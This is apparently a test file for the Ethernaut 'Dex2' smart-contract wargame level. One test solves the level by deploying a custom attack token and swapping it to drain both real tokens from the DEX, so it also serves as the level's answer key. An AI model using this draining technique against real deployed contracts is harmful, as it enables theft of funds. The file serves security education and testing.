const Dex2Factory = artifacts.require('./levels/Dex2Factory.sol')
const SwappableToken2 = artifacts.require('SwappableToken2')
const Dex2AttackToken = artifacts.require('Dex2AttackToken')
const Dex2 = artifacts.require('./levels/Dex2.sol')

const Ethernaut = artifacts.require('./Ethernaut.sol')
const { BN, constants, expectEvent, expectRevert } = require('openzeppelin-test-helpers')
const utils = require('../utils/TestUtils')


contract('Dex2', function (accounts) {

  let ethernaut
  let level
  let owner = accounts[1]
  let player = accounts[0]
  let instance

  before(async function () {
    ethernaut = await Ethernaut.new()
    level = await Dex2Factory.new()
    await ethernaut.registerLevel(level.address)
  });

  it('should fail if the player didnt solve the level', async function() {
    const instance = await utils.createLevelInstance(ethernaut, level.address, player, Dex2)
    const completed = await utils.submitLevelInstance(
      ethernaut,
      level.address,
      instance.address,
      player
    )

    assert.isFalse(completed)
  });

  it('should allow the player to solve the level', async function () {
    const instance = await utils.createLevelInstance(ethernaut, level.address, player, Dex2)

    const [token1Addr, token2Addr] = await Promise.all([ instance.token1(), instance.token2() ])
    const [token1, token2] = [token1Addr, token2Addr].map((a) => new SwappableToken2(a))
    let dexBalances = await Promise.all([token1.balanceOf(instance.address), token2.balanceOf(instance.address)])
    let playerBalances = await Promise.all([token1.balanceOf(player), token2.balanceOf(player)])
    assert.equal(dexBalances[0], 100)
    assert.equal(dexBalances[1], 100)
    assert.equal(playerBalances[0], 10)
    assert.equal(playerBalances[1], 10)

    const t = await Dex2AttackToken.new()

    // Drain funds through swap
    await instance.swap(t.address, token1.address, 1, { from: player })
    await instance.swap(t.address, token2.address, 1, { from: player })
    dexBalances = await Promise.all([token1.balanceOf(instance.address), token2.balanceOf(instance.address)])
    playerBalances = await Promise.all([token1.balanceOf(player), token2.balanceOf(player)])
    assert.equal(dexBalances[0], 0)
    assert.equal(dexBalances[1], 0)
    assert.equal(playerBalances[0], 110)
    assert.equal(playerBalances[1], 110)

    // Check win.
    const ethCompleted = await utils.submitLevelInstance(
      ethernaut,
      level.address,
      instance.address,
      player
    )
    assert.equal(ethCompleted, true)
  });
})
